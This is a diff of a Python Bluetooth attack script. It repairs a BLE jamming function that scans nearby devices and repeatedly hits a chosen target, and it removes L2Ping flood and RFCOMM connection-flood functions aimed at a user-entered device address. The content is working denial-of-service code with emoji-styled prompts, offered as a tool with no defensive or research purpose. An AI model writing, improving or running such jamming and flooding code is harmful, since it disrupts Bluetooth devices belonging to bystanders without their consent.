@@ -43,25 +43,28 @@ def spam_ble(target_mac):
     except Exception as e:
         print(f"⚠️ Error: {e}")
 
-# 🎯 BLE Jamming Function
+# 🎯 FIXED BLE Jamming Function!
 def jam_ble():
+    """Scan & jam a BLE device."""
     print("🔎 Scanning for BLE devices to jam 📡")
     scanner = Scanner()
     devices = scanner.scan(10.0)
 
-    for idx, device in enumerate(devices):
+    # Store devices as a list instead of dict_values
+    device_list = list(devices)
+
+    for idx, device in enumerate(device_list):
         print(f"🔹 {idx}: {device.addr} ({device.addrType}), RSSI={device.rssi} dB")
 
-    if not devices:
+    if not device_list:
         print("⚠️ No BLE devices found. Try again!")
         return
 
-    device_idx = input("💜 Enter the index of the device to jam: ")
     try:
-        device_idx = int(device_idx)
-        target_device = devices[device_idx].addr
+        device_idx = int(input("💜 Enter the index of the device to jam: "))
+        target_device = device_list[device_idx].addr  # FIXED!
     except (ValueError, IndexError):
-        print("⚠️ Invalid index.")
+        print("⚠️ Invalid index. Please enter a valid number!")
         return
 
     print(f"💥 Jamming device {target_device} 🚀💜")
@@ -74,64 +77,6 @@ def jam_ble():
             time.sleep(0.1)
     except BTLEException as e:
         print(f"⚠️ Failed to jam {target_device}: {e}")
-
-# 🦠 Party Pooper Features 🦠
-def start_bluetooth():
-    """Start the Bluetooth service if not running."""
-    print("📡 Starting Bluetooth service...")
-    subprocess.run(['sudo', 'service', 'bluetooth', 'start'], check=True)
-    print("✅ Bluetooth service started!")
-
-def scan_bluetooth():
-    """Scan for nearby Bluetooth devices."""
-    print("🔎 Scanning for Bluetooth devices...")
-    subprocess.run(['bluetoothctl', 'scan', 'on'], check=True)
-
-# 💥 CUSTOM L2PING FLOOD ATTACK (NOW FIXED!)
-def l2ping_attack():
-    """Send a customizable Bluetooth L2Ping flood attack to a target device."""
-    addr = input("💜 Enter Bluetooth Device Address to L2Ping: ")
-    
-    # Check for root privileges
-    if os.geteuid() != 0:
-        print("⚠️  L2Ping requires root privileges! Try running: sudo python3 spam_jam.py")
-        return
-
-    # User-customized attack settings
-    packet_size = input("💜 Enter packet size (default 600, max 672): ") or "600"
-    
-    try:
-        packet_size = int(packet_size)
-        if packet_size > 672:
-            print("⚠️ Packet size too large! Setting to max allowed: 672 bytes.")
-            packet_size = 672  # Auto-correct max size!
-    except ValueError:
-        print("⚠️ Invalid input! Using default size: 600 bytes.")
-        packet_size = 600  # Default to 600 if input is bad
-    
-    attack_mode = input("💜 Flood mode? (y/n): ").lower() == "y"
-    
-    if attack_mode:
-        print(f"💥 Flooding {addr} with {packet_size}-byte L2Ping packets!")
-        subprocess.run(['l2ping', '-i', 'hci0', '-s', str(packet_size), '-f', addr], check=True)
-    else:
-        print(f"💥 Sending single {packet_size}-byte L2Ping packet to {addr}")
-        subprocess.run(['l2ping', '-i', 'hci0', '-s', str(packet_size), addr], check=True)
-
-    print("✅ L2Ping attack complete!")
-
-def rfcomm_flood():
-    """Flood a Bluetooth device with RFCOMM connection attempts."""
-    addr = input("💜 Enter Bluetooth Device Address for RFCOMM Flood: ")
-    print(f"💥 Starting RFCOMM connection flood on {addr}...")
-    cmd = ['rfcomm', 'connect', addr, '1']
-
-    for i in range(1000):
-        try:
-            subprocess.run(cmd, check=True)
-            print(f"✅ Connected attempt {i+1} to {addr}")
-        except subprocess.CalledProcessError:
-            print(f"⚠️ Failed attempt {i+1} to connect to {addr}")
 
 # 🏁 Main Function: Choose Feature
 def main():
